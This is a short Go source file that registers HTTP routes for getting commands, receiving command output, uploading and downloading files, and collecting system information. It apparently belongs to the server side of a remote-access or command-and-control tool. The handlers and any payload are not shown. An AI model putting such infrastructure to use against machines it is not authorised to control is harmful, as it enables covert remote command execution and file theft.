package server

import (
	"fmt"
	"net/http"
)

func RunServer() {
	InitRoutes()
	err := cli.Run()
	if err != nil {
		fmt.Print(RedF("Error running the CLI: %v\n", err))
	}
}

func InitRoutes() {
	http.HandleFunc("/getcmd", GetCmd)
	http.HandleFunc("/cmdoutput", CmdOutput)
	http.HandleFunc("/upload", FileUpload)
	http.HandleFunc("/download", FileDownload)
	http.HandleFunc("/sysinfo", GetSysinfo)
}
